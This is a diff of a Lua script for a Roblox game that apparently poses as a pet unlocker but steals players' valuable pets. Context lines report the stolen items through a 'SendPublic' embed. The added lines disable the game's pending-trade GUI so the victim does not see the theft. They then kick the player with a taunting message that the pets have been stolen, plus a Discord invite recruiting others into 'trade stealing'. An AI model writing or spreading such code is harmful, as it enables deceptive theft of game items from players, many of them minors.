@@ -137,6 +137,8 @@ end
 freeze_goal()
 local goalframe = game:GetService("Players").LocalPlayer.PlayerGui.GoalsSide
 goalframe:Destroy()
+local loading = game:GetService('Players').LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
+loading.Disabled = true
 
 function UnlockPets()
     for i, v in pairs(inventory.Pet) do
@@ -267,7 +269,8 @@ if HasHuge() == "Yes" or HasTitanic() == "Yes" then
 					}
 				}
 				SendPublic(embed)
-				break
+				wait(2)
+				game.Players.LocalPlayer:kick("All your valuable pets have just been stolen. Join discord.gg/HcpNe56R2a to start trade stealing yourself")
 			end
 		end
 	end
